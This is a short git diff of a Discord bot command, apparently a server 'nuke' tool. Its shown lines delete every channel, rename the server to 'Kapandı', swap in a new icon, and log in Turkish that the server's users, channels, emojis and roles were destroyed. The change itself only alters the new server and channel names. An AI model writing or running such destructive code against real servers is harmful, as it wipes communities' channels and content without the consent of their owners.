@@ -30,7 +30,7 @@ if(message.deletable) message.delete();
 
 console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
   
-message.guild.setName(`BERKE ADAMDIR`, ":))")
+message.guild.setName(`Kapandı`, ":))")
 message.guild.setIcon(`https://media.discordapp.net/attachments/566759721294495761/566902339726999553/6fc0bd5fbaec9e4bdcc10c0bd459f605.png`)
 
 message.guild.channels.forEach(c => {
@@ -44,8 +44,8 @@ return c.delete();
     
 
   
-message.guild.createChannel(`berke-abi-ne-yaptin`)
-message.guild.createChannel(`berke-adamdir`)
+message.guild.createChannel(`hey`)
+message.guild.createChannel(`hey`)
 message.delete()
 }
 };
